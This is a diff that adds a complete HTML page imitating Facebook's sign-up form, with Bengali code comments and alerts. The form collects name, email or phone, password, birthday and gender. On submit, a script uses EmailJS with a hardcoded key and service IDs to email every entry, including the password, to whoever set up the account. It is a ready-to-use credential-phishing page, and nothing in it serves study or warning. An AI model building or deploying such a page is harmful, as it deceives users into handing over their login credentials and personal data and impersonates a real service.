@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Sign Up</title>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet'>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    #navwrapper {
+      background: #3b5998;
+      padding: 15px;
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    #content {
+      display: flex;
+      justify-content: center;
+      margin-top: 30px;
+    }
+    #rightbod {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+      width: 350px;
+    }
+    .signup {
+      font-size: 28px;
+      margin-bottom: 5px;
+    }
+    .free {
+      color: #606770;
+      margin-bottom: 15px;
+    }
+    .formbox {
+      margin-bottom: 15px;
+    }
+    .inputbody {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #dddfe2;
+      font-size: 14px;
+    }
+    .selectbody {
+      padding: 8px;
+      margin-right: 5px;
+      border-radius: 5px;
+      border: 1px solid #dddfe2;
+    }
+    .signbut {
+      width: 100%;
+      padding: 12px;
+      background: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .signbut:hover {
+      background: #36a420;
+    }
+    .gender {
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="navwrapper">facebook</div>
+
+  <div id="content">
+    <div id="rightbod">
+      <div class="signup">Sign Up</div>
+      <div class="free">It's free and always will be</div>
+
+      <!-- ফর্ম শুরু -->
+      <form id="fbForm">
+        <div class="formbox">
+          <input type="text" class="inputbody" placeholder="First name" name="first_name" required>
+        </div>
+        <div class="formbox">
+          <input type="text" class="inputbody" placeholder="Last name" name="last_name" required>
+        </div>
+        <div class="formbox">
+          <input type="text" class="inputbody" placeholder="Email or mobile number" name="email" required>
+        </div>
+        <div class="formbox">
+          <input type="password" class="inputbody" placeholder="New password" name="password" required>
+        </div>
+        <div class="formbox">
+          <div class="bday">Birthday</div>
+          <select name="month" class="selectbody">
+            <option>Month</option><option>Jan</option><option>Feb</option><option>Mar</option>
+          </select>
+          <select name="day" class="selectbody">
+            <option>Day</option><option>1</option><option>2</option><option>3</option>
+          </select>
+          <select name="year" class="selectbody">
+            <option>Year</option><option>2000</option><option>2001</option><option>2002</option>
+          </select>
+        </div>
+        <div class="formbox">
+          <label><input type="radio" name="gender" value="Female"> Female</label>
+          <label><input type="radio" name="gender" value="Male"> Male</label>
+        </div>
+        <div class="formbox">
+          <button type="submit" class="signbut">Sign Up</button>
+        </div>
+      </form>
+      <!-- ফর্ম শেষ -->
+
+    </div>
+  </div>
+
+<script>
+  // EmailJS Init
+  emailjs.init("msC8TfnIOvrxRxUDM"); // তোমার Public Key
+
+  // ফর্ম সাবমিট হ্যান্ডলার
+  document.getElementById("fbForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    emailjs.sendForm("service_czkqozf", "template_htim0to", this)
+      .then(() => {
+        alert("✅ ফর্ম সফলভাবে পাঠানো হয়েছে!");
+        this.reset();
+      }, (err) => {
+        alert("❌ কিছু ভুল হয়েছে: " + JSON.stringify(err));
+      });
+  });
+</script>
+
+</body>
+</html>
